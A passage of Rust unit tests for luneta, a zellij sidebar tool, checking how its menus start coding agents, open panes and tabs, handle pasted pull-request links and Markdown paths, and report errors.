        let clicked = sidebar.keys_clicked(Keyed::Legend, &char('d'), moment(160_000));
        assert_eq!(clicked, Asked::Nothing);
        assert_eq!(clicks(&mut sidebar, 17), delete);
        let deleted = sidebar.chose(1, Choice::Key(char('d')), moment(160_000));
        assert_ne!(deleted, Asked::Nothing);
    }

    /// The skills the menu's search finds at the bottom of the sidebar are
    /// spots that pick them: a click on one starts an agent on it, as
    /// `Enter` does with the cursor on it.
    #[test]
    fn a_click_on_a_skill_of_the_menu_under_the_rows_starts_an_agent_on_it() {
        let mut sidebar = two_sessions();
        sidebar.focus(Keys::Sidebar);
        sidebar.key(&char('m'), moment(160_000));
        let cwd = "/w/luneta/main".to_owned();
        let agent = agents::Harness::ClaudeCode;
        let find = Asked::Find { menu: 1, on: Machine::Local, cwd: cwd.clone(), agent };
        assert_eq!(sidebar.key(&char('/'), moment(160_000)), find);
        let name = |name: &str| Name::new(name.to_owned()).expect("a name");
        let skill = |named: &str| Skill {
            name: name(named),
            description: String::new(),
            runs: crate::skills::Runs::ForAnyone,
        };
        sidebar.found(1, agent, Ok(vec![skill("code-review"), skill("tigerstyle")]));
        let clicked = clicks(&mut sidebar, 15);
        let skills: Vec<(&str, Option<Hit>)> =
            clicked[1..4].iter().map(|(text, hit)| (text.as_str(), hit.clone())).collect();
        let on = |skill| Some(Hit::Menu(1, Choice::Skill(name(skill))));
        assert_eq!(skills, [
            (" _", None),
            (" /code-review", on("code-review")),
            (" /tigerstyle", on("tigerstyle")),
        ]);
        // A click on the skill of a menu that closed since does nothing.
        let tigerstyle = || Choice::Skill(name("tigerstyle"));
        assert_eq!(sidebar.chose(2, tigerstyle(), moment(160_000)), Asked::Nothing);
        let command = ["claude", "--name", "tigerstyle", "/tigerstyle"].map(str::to_owned).to_vec();
        let open = Open::Pane { session: session_name("older"), beside: 1, cwd, command };
        let open = Asked::Open { menu: 1, on: Machine::Local, open };
        assert_eq!(sidebar.chose(1, tigerstyle(), moment(160_000)), open);
    }

    /// A key of the menu starts an agent in the harness of the one in the
    /// row's pane, and on a pane with none, in the one picked last, which
    /// `Tab` picks, for this menu and every next one, and keeps for the
    /// next luneta.
    #[test]
    fn the_menu_starts_agents_in_the_pane_s_harness_or_else_the_one_picked_last() {
        let scratch = tempfile::tempdir().unwrap();
        let file = scratch.path().join("agent");
        let mut sidebar = two_sessions();
        sidebar.agent = Kept::within(file.clone()).0;
        if let Some(host) = &mut sidebar.host {
            host.agents[0].harness = Some(Harness::Pi.into());
        }
        sidebar.focus(Keys::Sidebar);
        let started = |menu, session: &str, beside, cwd: &str, harness, spelled| {
            let command = [harness, "--name", "tigerstyle", spelled].map(str::to_owned).to_vec();
            let (session, cwd) = (session_name(session), cwd.to_owned());
            let open = Open::Pane { session, beside, cwd, command };
            Asked::Open { menu, on: Machine::Local, open }
        };
        type_in(&mut sidebar, "c");
        let pi = started(1, "older", 1, "/w/luneta/main", "pi", "/skill:tigerstyle");
        assert_eq!(sidebar.key(&char('s'), moment(160_000)), pi);

        sidebar.focus(Keys::Zellij);
        sidebar.focus(Keys::Sidebar);
        sidebar.step(2);
        type_in(&mut sidebar, "c");
        let claude = started(2, "newer", 1, "/w/b", "claude", "/tigerstyle");
        assert_eq!(sidebar.key(&char('s'), moment(160_000)), claude);

        sidebar.focus(Keys::Zellij);
        sidebar.focus(Keys::Sidebar);
        type_in(&mut sidebar, "c");
        let tab = KeyEvent::from(KeyCode::Tab);
        assert_eq!(sidebar.key(&tab, moment(160_000)), Asked::Nothing);
        assert_eq!(std::fs::read_to_string(&file).unwrap(), "pi\n");
        let pi = started(3, "newer", 1, "/w/b", "pi", "/skill:tigerstyle");
        assert_eq!(sidebar.key(&char('s'), moment(160_000)), pi);
        sidebar.focus(Keys::Zellij);
        sidebar.focus(Keys::Sidebar);
        type_in(&mut sidebar, "c");
        let pi = started(4, "newer", 1, "/w/b", "pi", "/skill:tigerstyle");
        assert_eq!(sidebar.key(&char('s'), moment(160_000)), pi);
    }

    /// A key of the menu opens it at the bottom, for the highlighted row, and
    /// what it opens is where luneta goes, once zellij says what it opened. A
    /// tab of another session opens once luneta's zellij is there, whatever
    /// lunetad says of its clients: the last may have left since.
    #[test]
    fn a_key_of_the_menu_opens_it_for_the_highlighted_row() {
        let mut sidebar = two_sessions();
        sidebar.focus(Keys::Sidebar);
        assert_eq!(sidebar.key(&char('n'), moment(160_000)), Asked::Nothing);
        let lines = screen(&mut sidebar, true, 32, 16);
        assert_eq!(lines[10..], [
            "─ New ─────────── luneta/main ─",
            " p  new pane",
            " t  new tab",
            " s  new session",
            " m  new machine",
            " <BS> - Back, <ESC> - Close",
        ]);
        let (older, cwd) = (session_name("older"), "/w/luneta/main".to_owned());
        let tab = Tab { cwd, name: None, command: Vec::new() };
        let tab = Open::Tab { session: older, tab, alone_since: None };
        let tab = Asked::Open { menu: 1, on: Machine::Local, open: tab };
        assert_eq!(sidebar.key(&char('t'), moment(160_000)), tab);
        let opened = pane_of("older", 10, 7);
        assert_eq!(sidebar.opened(1, Ok(7)), go_here(opened));
        // What zellij answers a menu that is gone takes luneta nowhere.
        assert_eq!(sidebar.opened(1, Ok(8)), Asked::Nothing);

        let client = Client { id: 9, pane: None };
        if let Some(host) = &mut sidebar.host {
            host.sessions[0].clients = Some(Clients { clients: vec![client] });
        }
        sidebar.step(2);
        type_in(&mut sidebar, "n");
        let newer = pane_of("newer", 20, 1);
        let (session, cwd) = (session_name("newer"), "/w/b".to_owned());
        let tab = Tab { cwd, name: None, command: Vec::new() };
        let tab = Open::Tab { session, tab, alone_since: None };
        let asked = Asked::OpenThere { menu: 2, on: Machine::Local, place: newer, open: tab };
        assert_eq!(sidebar.key(&char('t'), moment(160_000)), asked);
        sidebar.focus(Keys::Zellij);
        assert!(sidebar.menu.is_none());
    }

    /// A key of the Turn group is for the highlighted row, of whatever session,
    /// and what it turns is where luneta goes, once zellij says it did. Only
    /// the menu waiting on the tabs goes on with them.
    #[test]
    fn a_key_of_the_turn_group_turns_the_pane_of_the_highlighted_row() {
        let mut sidebar = two_sessions();
        sidebar.focus(Keys::Sidebar);
        let on = Machine::Local;
        let older = PanePlace { session: listed("older", 10), pane: 1 };
        let turn = Turn::PaneIntoTab;
        let turned = Asked::Turn { menu: 1, on: on.clone(), place: older, turn };
        type_in(&mut sidebar, "t");
        assert_eq!(sidebar.key(&char('t'), moment(160_000)), turned);
        assert!(sidebar.waits_on(1));
        assert_eq!(sidebar.opened(1, Ok(1)), go_here(pane_of("older", 10, 1)));
        assert!(!sidebar.waits_on(1));
        assert_eq!(sidebar.opened(1, Ok(1)), Asked::Nothing);

        sidebar.step(2);
        type_in(&mut sidebar, "t");
        let newer = || PanePlace { session: listed("newer", 20), pane: 1 };
        let tabs = Asked::Tabs { menu: 2, on: on.clone(), session: session_name("newer"), pane: 1 };
        assert_eq!(sidebar.key(&char('p'), moment(160_000)), tabs);
        let other = || OtherTab { pane: 5, name: "Tab #2".to_owned() };
        assert_eq!(sidebar.tabs(1, Ok(vec![other()])), Asked::Nothing);
        let turn = Turn::TabIntoPanes { beside: 5 };
        let turned = Asked::Turn { menu: 2, on, place: newer(), turn };
        assert_eq!(sidebar.tabs(2, Ok(vec![other()])), turned);
        let none = Err("zellij found no room".to_owned());
        assert_eq!(sidebar.turned_into_panes(2, 1, none), Asked::Nothing);
        assert!(sidebar.menu.is_none());
        assert_eq!(sidebar.notice.as_deref(), Some("menu: not turned: zellij found no room"));
    }

    /// Every pane moved takes luneta to the row's. Some moved says how many,
    /// and not that nothing turned, and takes it nowhere, as that pane may be
    /// among the rest. A menu closed since hears nothing of it.
    #[test]
    fn what_came_of_turning_a_tab_is_said_as_it_was() {
        let waiting = || {
            let mut sidebar = two_sessions();
            sidebar.focus(Keys::Sidebar);
            type_in(&mut sidebar, "t");
            sidebar.key(&char('p'), moment(160_000));
            let other = OtherTab { pane: 5, name: "Tab #2".to_owned() };
            sidebar.tabs(1, Ok(vec![other]));
            assert!(sidebar.waits_on(1));
            sidebar
        };
        let mut sidebar = waiting();
        let went = sidebar.turned_into_panes(1, 1, Ok(IntoPanes::Done));
        assert_eq!(went, go_here(pane_of("older", 10, 1)));

        let mut sidebar = waiting();
        let why = "zellij found no room".to_owned();
        let partly = IntoPanes::Partly { moved: 2, of: 3, why };
        assert_eq!(sidebar.turned_into_panes(1, 1, Ok(partly.clone())), Asked::Nothing);
        assert!(sidebar.menu.is_none());
        let said = "menu: turned 2 of 3 panes: zellij found no room";
        assert_eq!(sidebar.notice.as_deref(), Some(said));

        let mut sidebar = waiting();
        sidebar.close_menu();
        assert_eq!(sidebar.turned_into_panes(1, 1, Ok(partly)), Asked::Nothing);
        assert_eq!(sidebar.notice, None);
    }

    /// A pull request's link pasted with the sidebar's keys opens the menu
    /// for it at the bottom, and other text does nothing. A key hands luneta
    /// every pane that says where it works, in the order of the rows, to find
    /// where it goes. A session luneta makes for it is where luneta goes, by
    /// its name, once zellij has opened its tab.
    #[test]
    fn a_pull_request_s_link_pasted_opens_the_menu_for_it() {
        let mut sidebar = two_sessions();
        if let Some(host) = &mut sidebar.host {
            let number = NonZeroU32::new(5).unwrap();
            let url = Some("https://github.com/lorenzolfm/luneta/pull/5".to_owned());
            let pull_request = PullRequest { number, state: State::Open, url, checks: None };
            host.pull_requests.push(pull_request.to_api("/w/b"));
        }
        sidebar.focus(Keys::Sidebar);
        sidebar.paste("ls -la");
        assert!(sidebar.menu.is_none());
        sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5\n");
        let lines = screen(&mut sidebar, true, 32, 17);
        assert_eq!(lines[12..], [
            "─ #5 ────── lorenzolfm/luneta ─",
            " w  worktree",
            " r  /thermo-nuclear-review",
            " tab  use pi",
            " <ESC> - Close",
        ]);
        let link = Link::parse("https://github.com/lorenzolfm/luneta/pull/5").unwrap();
        let worked = |session, pane, dir: &str, pull, here| Worked {
            session,
            pane,
            works: links::Worked { dir: dir.to_owned(), pull, here },
        };
        let worked = vec![
            worked(listed("older", 10), 1, "/w/luneta/main", None, true),
            worked(listed("older", 10), 2, "/w/c", None, true),
            worked(listed("newer", 20), 1, "/w/b", Some(link.clone()), false),
        ];
        let work = Work::Link(link.clone());
        let wanted = Wanted::AsItIs;
        let on = Machine::Local;
        let pull = Asked::Pull { menu: 1, on, work, wanted, worked, others: Vec::new() };
        assert_eq!(sidebar.key(&char('w'), moment(160_000)), pull);

        let at = At::Clone { cwd: "/w/n".to_owned(), name: session_name("newer-2") };
        let work = Readied::Link(link);
        let worktree = "/w/n/feat".to_owned();
        let ready = Ready { at, worktree, branch: None, moved_off: false, work };
        let asked = Asked::Make {
            menu: 1,
            on: Machine::Local,
            session: session_name("newer-2"),
            cwd: "/w/n".to_owned(),
            tab_cwd: "/w/n/feat".to_owned(),
            name: "#5".to_owned(),
            command: Vec::new(),
        };
        assert_eq!(sidebar.pulled(1, Ok(Found { on: Machine::Local, ready })), asked);
        if let Some(host) = &mut sidebar.host {
            host.sessions.push(session("newer-2", 30, vec![pane(1, 0, "/w/n", "fish")]));
        }
        let opened = pane_of("newer-2", 30, 3);
        assert_eq!(sidebar.opened(1, Ok(3)), go_here(opened));
    }

    /// A `.md` file's path pasted opens the menu for the file, whether or not
    /// it names a file, which a key finds out on the machine of the row. It
    /// goes by the directory the row highlighted works in. A row that works in
    /// none, as a session's, opens the menu all the same: an absolute path
    /// needs no directory, and a relative one says so once a key is pressed.
    /// Text that names no `.md` file does nothing.
    #[test]
    fn a_md_file_s_path_pasted_opens_the_menu_for_it() {
        let mut sidebar = two_sessions();
        sidebar.focus(Keys::Sidebar);
        for text in [
            "notes.txt",
            "two\nlines.md",
            "https://example.com/plan.md",
            "github.com/o/r/blob/main/README.md",
            ".md",
        ] {
            sidebar.paste(text);
            assert!(sidebar.menu.is_none(), "{text:?}");
        }
        let Some(Target::Pane(on, row)) = sidebar.target() else { panic!("not a pane's row") };
        let cwd = row.cwd.clone();
        sidebar.paste("  docs/plans/sync-rework.md\n");
        let lines = screen(&mut sidebar, true, 39, 17);
        assert_eq!(lines[12..], [
            "─ sync-rework ─ plans/sync-rework.md ─",
            " w  worktree",
            " t  tackle",
            " tab  use pi",
            " <ESC> - Close",
        ]);
        let Asked::Pull { on: asked_on, work, .. } = sidebar.key(&char('t'), moment(160_000))
        else {
            panic!("no job for the key");
        };
        assert_eq!(asked_on, on);
        let from = cwd.map(|cwd| Directory::parse(cwd).unwrap());
        assert_eq!(Some(work), Work::parse("docs/plans/sync-rework.md", from));

        let mut sidebar = two_sessions();
        sidebar.focus(Keys::Sidebar);
        sidebar.cursor = Some(Spot::Local(Place::Session(listed("older", 10))));
        sidebar.paste("/w/plan.md");
        let Asked::Pull { work, .. } = sidebar.key(&char('w'), moment(160_000)) else {
            panic!("no job for the key");
        };
        assert_eq!(Some(work), Work::parse("/w/plan.md", None));
    }

    #[test]
    fn w_says_a_worktree_moved_off_its_branch_and_t_starts_no_agent_on_it() {
        let page = "https://github.com/lorenzolfm/luneta/issues/5";
        let pressed = |key: char, branch: Option<&str>, moved_off: bool| {
            let mut sidebar = two_sessions();
            sidebar.focus(Keys::Sidebar);
            sidebar.paste(page);
            let number = sidebar.menu.as_ref().map_or(0, Menu::number);
            let Asked::Pull { wanted, .. } = sidebar.key(&char(key), moment(160_000)) else {
                panic!("no job for the key");
            };
            assert_eq!(wanted, Wanted::AsItIs);
            let at = At::Session((listed("older", 10), 1));
            let (worktree, work) = ("/w/luneta/issue-5", Readied::Link(Link::parse(page).unwrap()));
            let branch = branch.map(str::to_owned);
            let ready = Ready { at, worktree: worktree.to_owned(), branch, moved_off, work };
            let asked = sidebar.pulled(number, Ok(Found { on: Machine::Local, ready }));
            (matches!(asked, Asked::Open { .. } | Asked::OpenThere { .. }), sidebar.notice)
        };
        let on_dev_docs = "#5's worktree is on dev-docs, not issue-5";
        assert_eq!(pressed('w', Some("dev-docs"), true), (true, Some(on_dev_docs.to_owned())));
        let on_none = "#5's worktree is on no branch, not issue-5";
        assert_eq!(pressed('w', None, true), (true, Some(on_none.to_owned())));
        assert_eq!(pressed('w', Some("issue-5"), false), (true, None));
        assert_eq!(pressed('w', None, false), (true, None));

        assert_eq!(pressed('t', Some("dev-docs"), true), (false, None));
        assert_eq!(pressed('t', Some("issue-5"), false), (true, None));
        assert_eq!(pressed('t', None, false), (true, None));
    }

    #[test]
    fn w_goes_on_from_a_menu_whose_t_refused_a_worktree_that_moved_off() {
        let page = "https://github.com/lorenzolfm/luneta/issues/5";
        for keys in [Keys::Sidebar, Keys::Menu { lent: true }] {
            let mut sidebar = two_sessions();
            sidebar.focus(Keys::Sidebar);
            sidebar.focus(keys);
            sidebar.paste(page);
            let number = sidebar.menu.as_ref().map_or(0, Menu::number);
            let Asked::Pull { .. } = sidebar.key(&char('t'), moment(160_000)) else {
                panic!("no job for the key");
            };
            let at = At::Session((listed("older", 10), 1));
            let branch = Some("dev-docs".to_owned());
            let (worktree, work) = ("/w/luneta/issue-5", Readied::Link(Link::parse(page).unwrap()));
            let ready = Ready { at, worktree: worktree.to_owned(), branch, moved_off: true, work };
            let asked = sidebar.pulled(number, Ok(Found { on: Machine::Local, ready }));
            assert_eq!(asked, Asked::Nothing);
            assert_eq!(sidebar.floating().is_some(), matches!(keys, Keys::Menu { .. }));
            assert_eq!((sidebar.said(), sidebar.notice.as_deref()), (None, None));
            let Asked::Pull { wanted: Wanted::AsItIs, .. } =
                sidebar.key(&char('w'), moment(161_000))
            else {
                panic!("no job for the key");
            };
        }
    }

    /// A row that says where it works by no absolute path, as an agent's
    /// session file may, whose pane zellij has not said the directory of,
    /// works in none a file's path can go from: read from luneta's own, it
    /// would name some other file.
    #[test]
    fn a_row_by_no_absolute_path_is_no_directory_for_a_file_s_path() {
        let mut sidebar = fresh();
        let unsaid = Pane { cwd: None, ..pane(1, 0, "", "claude") };
        let elsewhere = Agent { cwd: "w/luneta".to_owned(), ..agent("s", 1, Status::Idle, None) };
        sidebar.heard(host(vec![session("s", 10, vec![unsaid])], vec![elsewhere]));
        sidebar.focus(Keys::Sidebar);
        type_in(&mut sidebar, "j");
        assert_eq!(sidebar.target().as_ref().and_then(Target::cwd), Some("w/luneta"));
        sidebar.paste("docs/plan.md");
        let Asked::Pull { work, .. } = sidebar.key(&char('w'), moment(160_000)) else {
            panic!("no job for the key");
        };
        assert_eq!(Some(work), Work::parse("docs/plan.md", None));
    }

    /// The menu on an agent's row whose pane zellij has not said the
    /// directory of yet is for where the agent works, as the row says it, and
    /// opens beside the agent there.
    #[test]
    fn the_menu_on_an_agent_is_for_where_its_row_says_it_works() {
        let mut sidebar = fresh();
        let unsaid = Pane { cwd: None, ..pane(1, 0, "", "claude") };
        let agents = vec![agent("s", 1, Status::Idle, None)];
        sidebar.heard(host(vec![session("s", 10, vec![unsaid])], agents));
        sidebar.focus(Keys::Sidebar);
        type_in(&mut sidebar, "j");
        assert_eq!(cursor(&sidebar), Some(pane_of("s", 10, 1)));
        assert_eq!(sidebar.key(&char('n'), moment(160_000)), Asked::Nothing);
        let lines = screen(&mut sidebar, true, 32, 12);
        assert_eq!(lines[6], "─ New ─────────── luneta/main ─", "{lines:?}");
        let (session, cwd) = (session_name("s"), "/w/luneta/main".to_owned());
        let pane = Open::Pane { session, beside: 1, cwd, command: Vec::new() };
        let pane = Asked::Open { menu: 1, on: Machine::Local, open: pane };
        assert_eq!(sidebar.key(&char('p'), moment(160_000)), pane);
    }

    /// The menu on a shell's row is for the command its shell said it ran
    /// last: `c f` has luneta keep what that printed, and once kept, opens
    /// an agent on it beside the pane. One kept for a menu that closed since
    /// goes nowhere. On a shell whose command runs still, the menu says why
    /// it starts none.
    #[test]
    fn the_menu_on_a_shell_s_row_starts_an_agent_on_its_last_command() {
        let mut sidebar = fresh();
        let failed = in_shell(1, ended("cargo test", Some(101), 3000));
        let busy = in_shell(2, going("make", 100, Front::Working));
        sidebar.heard(host(vec![session("s", 10, vec![failed, busy])], Vec::new()));
        sidebar.focus(Keys::Sidebar);
        type_in(&mut sidebar, "gg");
        assert_eq!(cursor(&sidebar), Some(pane_of("s", 10, 1)));
        type_in(&mut sidebar, "c");
        let at = SystemTime::UNIX_EPOCH + Duration::from_secs(130);
        let command = Said::new("cargo test".to_owned()).unwrap();
        let failed = menu::Ended { command, ending: Some(Ending::Exited(101)), at };
        let (on, s) = (Machine::Local, session_name("s"));
        let printed = Asked::Printed { menu: 1, on, session: s, pane: 1, ended: failed };
        assert_eq!(sidebar.key(&char('f'), moment(160_000)), printed);
        let nothing = || Ok(Printed::Nothing);
        assert_eq!(sidebar.printed(2, nothing()), Asked::Nothing);
        let prompt = "Fix this. In my shell, `cargo test` ended with exit status 101. It printed \
                      nothing.";
        let command = vec!["claude".to_owned(), prompt.to_owned()];
        let cwd = "/w/luneta/main".to_owned();
        let open = Open::Pane { session: session_name("s"), beside: 1, cwd, command };
        let open = Asked::Open { menu: 1, on: Machine::Local, open };
        assert_eq!(sidebar.printed(1, nothing()), open);
        assert_eq!(sidebar.key(&KeyEvent::from(KeyCode::Esc), moment(160_000)), Asked::Nothing);

        type_in(&mut sidebar, "jcf");
        assert!(sidebar.menu.is_none());
        let why = "menu: pane 2 runs `make` still, and what it prints is not over";
        assert_eq!(sidebar.notice.as_deref(), Some(why));

        // The menu has what the row's shell ran as the daemon says it now: a
        // command that ends while it is open is one to start an agent on, and
        // one the shell goes on from as luneta reads it starts none.
        type_in(&mut sidebar, "c");
        let shells = |busy: Doing| {
            let failed = in_shell(1, ended("cargo test", Some(101), 3000));
            host(vec![session("s", 10, vec![failed, in_shell(2, busy)])], Vec::new())
        };
        sidebar.heard(shells(ended("make", Some(2), 3000)));
        let command = Said::new("make".to_owned()).unwrap();
        let make = menu::Ended { command, ending: Some(Ending::Exited(2)), at };
        let (on, s) = (Machine::Local, session_name("s"));
        let printed = Asked::Printed { menu: 3, on, session: s, pane: 2, ended: make };
        assert_eq!(sidebar.key(&char('f'), moment(160_000)), printed);
        sidebar.heard(shells(going("make", 200, Front::Working)));
        assert_eq!(sidebar.printed(3, nothing()), Asked::Nothing);
        assert!(sidebar.menu.is_none());
        let why = "menu: pane 2's shell went on as luneta read what `make` printed; ask again";
        assert_eq!(sidebar.notice.as_deref(), Some(why));
    }

    /// The menu floats over zellij for the pane luneta's zellij is on,
    /// wherever the highlight is, and in a folded session too, and the
    /// sidebar stands meanwhile as it does under a brief. Its keys open beside
    /// that pane, where it works and for the branch checked out there, and
    /// what they open is where luneta goes, as for the menu at the bottom.
    /// None floats until the sidebar knows which pane zellij is on, and it
    /// says why. It closes with its box.
    #[test]
    fn the_menu_floats_over_zellij_for_the_pane_zellij_is_on() {
        let mut sidebar = fresh();
        let mut host = host(
            vec![
                session("newer", 20, vec![pane(1, 0, "/w/b", "fish")]),
                session("older", 10, vec![pane(1, 0, "/w/luneta/main", "claude")]),
            ],
            vec![agent("older", 1, Status::Waiting, Some("fold"))],
        );
        let head = Some(api::checkout::Head::Branch(api::Branch {
            name: "feat/menu".to_owned(),
            upstream: None,
            changed: None,
        }));
        let changes = Some(api::Changes::default());
        let checkout = api::Checkout { head, changes, stashes: 0, repository: None };
        host.work_trees = vec![api::WorkTree {
            dir: "/w/luneta/main".to_owned(),
            stands: Some(api::work_tree::Stands::Checkout(checkout)),
        }];
        sidebar.heard(host);
        let look = sidebar.titled("older | fold".to_owned()).expect("a look");
        assert_eq!(sidebar.float_menu(), Err(NO_HERE_PANE));
        assert!(sidebar.floating().is_none());
        let clients = vec![Client { id: 1, pane: Some(1) }];
        sidebar.looked(Looked { number: look.number, went: None, clients, before: None });

        // The highlight on the newer session's pane, and the older folded.
        sidebar.focus(Keys::Sidebar);
        type_in(&mut sidebar, "hjj");
        assert!(folded(&sidebar, "older"));
        assert_eq!(cursor(&sidebar), Some(pane_of("newer", 20, 1)));
        // The sidebar as it stands, the keys where they are.
        let standing = |sidebar: &mut Sidebar| {
            let area = Rect::new(0, 0, 32, 14);
            let mut buffer = Buffer::empty(area);
            sidebar.draw(&mut buffer, area, moment(160_000));
            let row = |y| (0..32).map(|x| buffer[(x, y)].symbol()).collect::<String>();
            (0..14).map(row).collect::<Vec<_>>()
        };
        sidebar.focus(Keys::Lent);
        let lent = standing(&mut sidebar);
        sidebar.focus(Keys::Sidebar);
        assert_eq!(sidebar.float_menu(), Ok(()));
        sidebar.focus(Keys::Menu { lent: true });
        assert_eq!(standing(&mut sidebar), lent);
        let target = sidebar.floating().map(Menu::target).cloned();
        assert_eq!(target, Some(Target::Pane(Machine::Local, PaneRow {
            session: listed("older", 10),
            pane: 1,
            cwd: Some("/w/luneta/main".to_owned()),
            branch: Some("feat/menu".to_owned()),
            repository: None,
            pull_request: None,
            ran: Ran::Unhooked,
        })));

        let (older, cwd) = (session_name("older"), "/w/luneta/main".to_owned());
        let tab = Tab { cwd: cwd.clone(), name: None, command: vec![] };
        let tab = Open::Tab { session: older.clone(), tab, alone_since: None };
        type_in(&mut sidebar, "n");
        let tab = Asked::Open { menu: 1, on: Machine::Local, open: tab };
        assert_eq!(sidebar.key(&char('t'), moment(160_000)), tab);
        let opened = pane_of("older", 10, 7);
        assert_eq!(sidebar.opened(1, Ok(7)), go_here(opened));
        assert!(sidebar.floating().is_none());
        sidebar.focus(Keys::Zellij);

        assert_eq!(sidebar.float_menu(), Ok(()));
        sidebar.focus(Keys::Menu { lent: false });
        type_in(&mut sidebar, "c");
        let command = ["claude", "--name", "thermo-nuclear-review: feat/menu", "/thermo-nuclear-review"];
        let command = command.map(str::to_owned).to_vec();
        let pane = Open::Pane { session: older, beside: 1, cwd, command };
        let pane = Asked::Open { menu: 2, on: Machine::Local, open: pane };
        assert_eq!(sidebar.key(&char('t'), moment(160_000)), pane);
        // zellij has the keys again, which the sidebar never held meanwhile.
        sidebar.focus(Keys::Zellij);
        assert!(sidebar.menu.is_none());
    }

    /// What you say can name a skill only to an agent started at a prompt in
    /// the pane luneta's zellij is on, of that agent's directory as zellij
    /// says it, and of its harness, which finds its skills: not to a shell,
    /// nor to one where a shell ran `claude -p`.
    #[test]
    fn the_agent_here_is_the_one_in_the_pane_luneta_s_zellij_is_on() {
        let on_pane = |id: u32| {
            let mut sidebar = fresh();
            let panes = vec![
                pane(1, 0, "/w/a", "claude"),
                pane(2, 0, "/w/b", "fish"),
                pane(3, 0, "/w/c", "fish"),
                pane(4, 0, "/w/d", "pi"),
            ];
            let printing = agent("s", 3, Status::Busy, None);
            let printing = Agent { entrypoint: Some("sdk-cli".to_owned()), ..printing };
            let pi = Agent {
                harness: Some(Harness::Pi.into()),
                entrypoint: Some("tui".to_owned()),
                ..agent("s", 4, Status::Idle, None)
            };
            let agents = vec![agent("s", 1, Status::Idle, None), printing, pi];
            sidebar.heard(host(vec![session("s", 10, panes)], agents));
            assert_eq!(sidebar.here_agent(), None);
            let look = sidebar.titled("s | fish".to_owned()).expect("a look");
            let clients = vec![Client { id: 1, pane: Some(id) }];
            sidebar.looked(Looked { number: look.number, went: None, clients, before: None });
            sidebar.here_agent()
        };
        let session = SessionName::running("s").expect("a name");
        let (dir, harness) = ("/w/a".to_owned(), agents::Harness::ClaudeCode);
        let here = HereAgent { on: Machine::Local, session, pane: 1, dir, harness };
        assert_eq!(on_pane(1), Some(here));
        assert_eq!(on_pane(2), None);
        assert_eq!(on_pane(3), None);
        let session = SessionName::running("s").expect("a name");
        let (dir, harness) = ("/w/d".to_owned(), agents::Harness::Pi);
        let here = HereAgent { on: Machine::Local, session, pane: 4, dir, harness };
        assert_eq!(on_pane(4), Some(here));
    }

    /// What goes wrong with what the menu over zellij does is said over
    /// zellij, where you look, and the sidebar collapsed has no room for:
    /// luneta takes it once, and it stays out of the notes, but for what
    /// luneta did not take as the box gave up the keys. The menu at the bottom
    /// says it in the notes. What went wrong before goes from the notes as the
    /// menu floats, and one that cannot float says why.
    #[test]
    fn the_menu_over_zellij_says_over_zellij_what_went_wrong() {
        let mut sidebar = fresh();
        let unknown = Pane { cwd: None, ..pane(1, 0, "/w/b", "fish") };
        sidebar.heard(host(vec![session("only", 10, vec![unknown])], Vec::new()));
        let look = sidebar.titled("only | fish".to_owned()).expect("a look");
        let clients = vec![Client { id: 1, pane: Some(1) }];
        sidebar.looked(Looked { number: look.number, went: None, clients, before: None });
        let wrong = "menu: luneta does not know yet where pane 1 works; try again in a moment";

        assert_eq!(sidebar.float_menu(), Ok(()));
        sidebar.focus(Keys::Menu { lent: false });
        type_in(&mut sidebar, "np");
        assert!(sidebar.floating().is_none());
        assert_eq!(sidebar.said().as_deref(), Some(wrong));
        assert_eq!((sidebar.said(), sidebar.notice.as_deref()), (None, None));
        sidebar.focus(Keys::Zellij);

        assert_eq!(sidebar.float_menu(), Ok(()));
        sidebar.focus(Keys::Menu { lent: false });
        type_in(&mut sidebar, "np");
        sidebar.focus(Keys::Zellij);
        assert_eq!((sidebar.said(), sidebar.notice.as_deref()), (None, Some(wrong)));

        sidebar.focus(Keys::Sidebar);
        type_in(&mut sidebar, "np");
        assert_eq!((sidebar.said(), sidebar.notice.as_deref()), (None, Some(wrong)));
        assert_eq!(sidebar.float_menu(), Ok(()));
        assert!(sidebar.notice.is_none());

        let mut sidebar = fresh();
        let twin = || session("twin", 10, vec![pane(1, 0, "/w/b", "fish")]);
        sidebar.heard(host(vec![twin(), Session { socket: 11, ..twin() }], Vec::new()));
        let look = sidebar.titled("twin | fish".to_owned()).expect("a look");
        let clients = vec![Client { id: 1, pane: Some(1) }];
        sidebar.looked(Looked { number: look.number, went: None, clients, before: None });
        assert_eq!(sidebar.float_menu(), Err(TWIN_SESSIONS));
    }

    /// The Brief group's keys brief you by the row the menu was for: `b z` on
    /// every session, in the rows' order, as you moved them too, `b s` on the
    /// row's session, and `b h` on the agent in the row's pane, or on a
    /// session's row, on its session. An agent is told of by its row's name,
    /// its status and its branch, a folded session's too. With none there,
    /// the sidebar says so.
    #[test]
    fn the_brief_s_keys_brief_you_by_the_row_the_menu_was_for() {
        let mut sidebar = two_sessions();
        let mut host = sidebar.host.clone().expect("a host");
        let id = "0b7c5e1a-2f3d-4c6b-9a8e-1d2c3b4a5f60";
        host.agents[0].session_id = id.to_owned();
        let head = Some(api::checkout::Head::Branch(api::Branch {
            name: "feat/brief".to_owned(),
            upstream: None,
            changed: None,
        }));
        let changes = Some(api::Changes::default());
        let checkout = api::Checkout { head, changes, stashes: 0, repository: None };
        host.work_trees = vec![api::WorkTree {
            dir: "/w/luneta/main".to_owned(),
            stands: Some(api::work_tree::Stands::Checkout(checkout)),
        }];
        sidebar.heard(host);
        sidebar.focus(Keys::Sidebar);
        let older = || SessionName::parse("older").unwrap();
        let fold = Note {
            on: Machine::Local,
            session: older(),
            pane: 1,
            name: "fold".to_owned(),
            status: "waiting".to_owned(),
            since: Some(SystemTime::UNIX_EPOCH + Duration::from_secs(100)),
            branch: Some("feat/brief".to_owned()),
            cwd: "/w/luneta/main".to_owned(),
            transcript: Transcript::Named(SessionId::parse(id).unwrap()),
        };
        let brief = |over: Over| Asked::Brief(Brief::new(over, vec![fold.clone()]).unwrap());
        let here = |sessions: [&str; 2]| {
            let sessions = sessions.map(|it| (Machine::Local, SessionName::parse(it).unwrap()));
            Over::Sessions { sessions: sessions.into(), unknown: Vec::new() }
        };
        let every = || here(["older", "newer"]);
        let session = || Over::Session(Machine::Local, older());
        let agent = Over::Agent(Machine::Local, older(), 1);
        for (key, over) in [('z', every()), ('s', session()), ('h', agent)] {
            type_in(&mut sidebar, "b");
            assert_eq!(sidebar.key(&char(key), moment(160_000)), brief(over), "{key}");
            assert!(sidebar.menu.is_none(), "{key}");
        }
        // nvim's pane has no agent, and the newer session none.
        sidebar.step(1);
        type_in(&mut sidebar, "bh");
